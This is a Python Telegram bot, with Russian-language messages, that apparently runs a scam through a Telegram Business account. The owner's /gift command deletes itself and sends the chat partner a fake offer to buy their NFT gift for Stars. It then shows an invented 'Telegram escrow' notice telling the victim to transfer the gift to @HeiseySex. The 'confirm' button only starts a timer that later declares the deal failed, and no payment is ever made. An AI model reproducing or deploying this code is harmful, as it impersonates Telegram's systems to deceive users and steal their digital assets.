import os
import re
import time
import threading
import requests
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ─────────────────────── НАСТРОЙКИ ───────────────────────

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
if not BOT_TOKEN:
    print("[FATAL] BOT_TOKEN missing", flush=True)
    raise SystemExit(1)

OWNER_ID = 861423393
TARGET_URL = "https://t.me/HeiseySex"
VERIFY_TIMEOUT = 300

# ─────────────────────── БОТ ───────────────────────

bot = telebot.TeleBot(BOT_TOKEN)
offers = {}
offers_lock = threading.Lock()


# ─────────────────────── ХЕЛПЕРЫ ───────────────────────

def log(msg):
    print(f"[LOG] {msg}", flush=True)


def normalize_url(raw):
    raw = raw.strip().strip('"').strip("'")
    if raw.startswith("@"):
        return f"https://t.me/{raw[1:]}"
    if raw.startswith(("http://", "https://")):
        return raw
    return f"https://t.me/{raw.lstrip('/')}"


def parse_gift(text):
    text = re.sub(r'^/gift(@\w+)?', '/gift', text)
    body = text.replace("/gift", "", 1).strip()
    if not body:
        return None

    quoted = re.findall(r'"([^"]*)"', body)
    rest = re.sub(r'"[^"]*"', ' ', body).strip()

    name = url = amount = None

    if len(quoted) >= 3:
        name, url = quoted[0], normalize_url(quoted[1])
        m = re.search(r'\d+', quoted[2])
        amount = m.group(0) if m else None
    elif len(quoted) == 2:
        name, url = quoted[0], normalize_url(quoted[1])
        m = re.search(r'\d+', rest)
        amount = m.group(0) if m else None
    elif len(quoted) == 1:
        name = quoted[0]
        toks = rest.split()
        if len(toks) >= 2:
            url = normalize_url(toks[0])
            m = re.search(r'\d+', toks[1])
            amount = m.group(0) if m else None
    else:
        toks = body.split()
        if len(toks) < 3:
            return None
        name, url = toks[0], normalize_url(toks[1])
        m = re.search(r'\d+', toks[2])
        amount = m.group(0) if m else None

    if not (name and url and amount):
        log(f"PARSE FAIL: name={name!r} url={url!r} amount={amount!r}")
        return None
    return name, url, amount


def offer_text(name, url, amount):
    return (
        "Вам поступило предложение о покупке подарка.\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Пользователь предлагает вам <b>{amount}</b> ⭐ за подарок "
        f"<a href=\"{url}\">{name}</a>.\n\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )


def offer_kb():
    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton("✅ Принять", callback_data="stage_accept"),
        InlineKeyboardButton("❌ Отклонить", callback_data="stage_decline"),
    )
    return kb


def escrow_text(name, url, amount):
    return (
        f"Пользователь зарезервировал <b>{amount}</b> ⭐ через "
        "эксроу-систему Telegram. Средства хранятся на специальном "
        "эксроу-счёте и будут автоматически зачислены на ваш баланс "
        "звёзд сразу после передачи подарка.\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "<b>Инструкция для завершения сделки:</b>\n\n"
        f"1. Передайте подарок пользователю: @HeiseySex\n"
        f"2. Нажмите «Передать NFT» и выберите "
        f"<a href=\"{url}\">{name}</a>\n"
        "3. Подтвердите передачу подарка.\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Telegram зафиксирует транзакцию и моментально зачислит "
        f"<b>{amount}</b> ⭐ на ваш баланс."
    )


def escrow_kb():
    kb = InlineKeyboardMarkup()
    kb.row(InlineKeyboardButton("🔗 Передать подарок", url=TARGET_URL))
    kb.row(
        InlineKeyboardButton("⚡ Подтвердить", callback_data="stage_verify"),
        InlineKeyboardButton("❌ Отменить", callback_data="stage_decline"),
    )
    return kb


def delete_msg(chat_id, message_id, conn_id=None):
    try:
        if conn_id:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
            r = requests.post(url, json={
                "chat_id": chat_id,
                "message_id": message_id,
                "business_connection_id": conn_id,
            }, timeout=10)
            if r.status_code == 200:
                log(f"DELETE {message_id} ok (business)")
            else:
                desc = r.text
                if "message to delete not found" in desc:
                    log(f"DELETE {message_id} already gone")
                else:
                    log(f"DELETE fail: {r.status_code} {desc}")
        else:
            bot.delete_message(chat_id, message_id)
            log(f"DELETE {message_id} ok")
    except Exception as e:
        log(f"DELETE ex: {e}")


def safe_edit(chat_id, message_id, text, kb=None, conn_id=None):
    kw = {"chat_id": chat_id, "message_id": message_id, "parse_mode": "HTML"}
    if kb is not None:
        kw["reply_markup"] = kb
    if conn_id:
        kw["business_connection_id"] = conn_id
    try:
        bot.edit_message_text(text, **kw)
        return True
    except Exception as e:
        log(f"EDIT {message_id}: {e}")
        return False


def send_biz(chat_id, text, conn_id, kb=None):
    kw = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "HTML",
        "business_connection_id": conn_id,
    }
    if kb is not None:
        kw["reply_markup"] = kb
    try:
        sent = bot.send_message(**kw)
        log(f"SEND ok → chat {chat_id}, msg {sent.message_id}")
        return sent
    except Exception as e:
        err = str(e)
        log(f"SEND FAIL → chat {chat_id}: {err}")
        if "PRIVACY_PREMIUM_REQUIRED" in err:
            log("  → Premium-фильтр у собеседника")
        elif "CHAT_WRITE_FORBIDDEN" in err:
            log("  → Собеседник запретил сообщения от ботов")
        elif "USER_IS_BLOCKED" in err:
            log("  → Заблокирован")
        elif "PEER_FLOOD" in err:
            log("  → Спам-блок")
        return None


# ─────────────────────── ТАЙМЕР ───────────────────────

def verify_timeout(chat_id, message_id, conn_id):
    time.sleep(VERIFY_TIMEOUT)
    safe_edit(
        chat_id, message_id,
        "⛔ <b>Сделка не завершена.</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "Вы не выполнили все условия передачи подарка.\n\n"
        "Передача не была подтверждена в установленное время, "
        "поэтому резерв средств был снят, а предложение — "
        "автоматически аннулировано.\n\n"
        "Если вы всё ещё хотите завершить сделку, попросите "
        "пользователя отправить предложение повторно.\n\n"
        "━━━━━━━━━━━━━━━━━━━━",
        conn_id=conn_id,
    )
    log(f"VERIFY-TIMEOUT msg {message_id}")


# ─────────────────────── ОСНОВНОЙ ОБРАБОТЧИК ───────────────────────

@bot.message_handler(func=lambda m: True, content_types=["text"])
def on_message(message):
    conn_id = getattr(message, "business_connection_id", None)
    uid = message.from_user.id if message.from_user else None
    text = message.text or ""

    log(f"MSG uid={uid} chat={message.chat.id} conn={conn_id} text={text[:80]!r}")

    # /start — работаем и в личке с ботом, и в Business
    if text == "/start":
        try:
            bot.send_message(
                message.chat.id,
                "Бот работает. Отправь: /gift \"Название\" \"ссылка\" 100",
                business_connection_id=conn_id if conn_id else None,
            )
        except Exception as e:
            log(f"/start err: {e}")
        return

    # реагируем только на владельца
    if uid != OWNER_ID:
        log(f"IGNORE: uid={uid} != {OWNER_ID}")
        return

    if not text.startswith("/gift"):
        return

    parsed = parse_gift(text)
    if not parsed:
        if conn_id:
            send_biz(message.chat.id,
                     "❌ Неверный формат.\n/gift \"Название\" \"ссылка\" 100",
                     conn_id)
        return

    name, url, amount = parsed
    log(f"GIFT: name={name!r} url={url!r} amount={amount!r}")

    if conn_id:
        # Business-чат — оффер от твоего имени
        delete_msg(message.chat.id, message.message_id, conn_id)
        sent = send_biz(message.chat.id,
                        offer_text(name, url, amount),
                        conn_id,
                        kb=offer_kb())
        if sent:
            with offers_lock:
                offers[sent.message_id] = {
                    "name": name, "url": url, "amount": amount,
                    "conn_id": conn_id, "chat_id": message.chat.id,
                }
    else:
        # Обычная личка с ботом (для тестов)
        sent = bot.send_message(
            message.chat.id, offer_text(name, url, amount),
            parse_mode="HTML", reply_markup=offer_kb(),
        )
        log(f"GIFT sent (обычный чат), msg {sent.message_id}")


# ─────────────────────── КНОПКИ ───────────────────────

@bot.callback_query_handler(func=lambda c: True)
def on_callback(call):
    log(f"CALLBACK {call.data} from {call.from_user.id}")
    conn_id = getattr(call.message, "business_connection_id", None)
    payload = call.data

    with offers_lock:
        offer = offers.get(call.message.message_id)

    # Извлекаем name/url/amount из текста, если offer потерян
    text_html = call.message.html_text or call.message.text or ""
    m = re.search(r'<a href="([^"]+)">([^<]+)</a>', text_html)
    url = m.group(1) if m else TARGET_URL
    name = m.group(2) if m else "Подарок"
    m2 = re.search(r'<b>(\d+)</b>\s*⭐', text_html)
    amount = m2.group(1) if m2 else "0"

    if payload == "stage_accept":
        bot.answer_callback_query(
            call.id,
            text="Ознакомьтесь с инструкцией на следующем экране.",
            show_alert=True,
        )
        safe_edit(
            call.message.chat.id, call.message.message_id,
            escrow_text(name, url, amount),
            kb=escrow_kb(), conn_id=conn_id,
        )

    elif payload == "stage_verify":
        bot.answer_callback_query(call.id)
        safe_edit(
            call.message.chat.id, call.message.message_id,
            "⏳ <b>Проверка передачи…</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Система проверяет статус передачи подарка. "
            "Это может занять несколько минут.\n\n"
            "Пожалуйста, не закрывайте чат.\n\n"
            "━━━━━━━━━━━━━━━━━━━━",
            conn_id=conn_id,
        )
        t = threading.Thread(
            target=verify_timeout,
            args=(call.message.chat.id, call.message.message_id, conn_id),
            daemon=True,
        )
        t.start()

    elif payload == "stage_decline":
        bot.answer_callback_query(call.id, text="Предложение отклонено.")
        safe_edit(
            call.message.chat.id, call.message.message_id,
            "❌ <b>Предложение отклонено.</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Сессия закрыта. Если вы передумаете, "
            "пользователь может отправить предложение повторно.\n\n"
            "━━━━━━━━━━━━━━━━━━━━",
            conn_id=conn_id,
        )


# ─────────────────────── HTTP СЕРВЕР ДЛЯ RENDER ───────────────────────

from http.server import BaseHTTPRequestHandler, HTTPServer


class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()

    def log_message(self, *args):
        pass  # не спамим в лог


def run_http():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(("0.0.0.0", port), HealthHandler)
    log(f"HTTP listening on {port}")
    server.serve_forever()


# ─────────────────────── ЗАПУСК ───────────────────────

if __name__ == "__main__":
    log("Starting bot...")
    log(f"OWNER_ID: {OWNER_ID}")

    # HTTP в отдельном потоке
    threading.Thread(target=run_http, daemon=True).start()

    # Запуск polling
    log("Polling started")
    bot.infinity_polling(
        allowed_updates=["message", "callback_query", "business_connection"],
        timeout=30,
    )
